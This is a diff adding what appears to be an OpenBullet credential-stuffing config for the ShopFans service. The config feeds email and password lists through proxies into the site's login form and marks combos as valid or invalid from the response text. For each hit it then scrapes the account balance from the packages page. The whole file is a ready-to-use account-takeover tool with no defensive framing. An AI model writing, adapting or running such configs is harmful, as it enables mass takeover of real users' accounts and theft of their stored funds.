@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "ShopFans",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-17T01:46:20.5976486-04:00",
+  "AdditionalInfo": "",
+  "Author": "SecretAnon",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": true,
+  "AlwaysQuit": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOG_REQ REQUEST POST "https://app.shopfans.com/login.html" 
+  CONTENT "LoginForm%5Bemail%5D=<USER>&LoginForm%5Bpassword%5D=<PASS>&LoginForm%5BrememberMe%5D=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Enter valid login and password" 
+  KEYCHAIN Success OR 
+    KEY "Purchase Name" 
+NAVIGATE "https://app.shopfans.com/packages.html" 
+PARSE "<SOURCE>" LR "</span><span class=\"value positive\">" "</span></span>" -> CAP "Balance" 
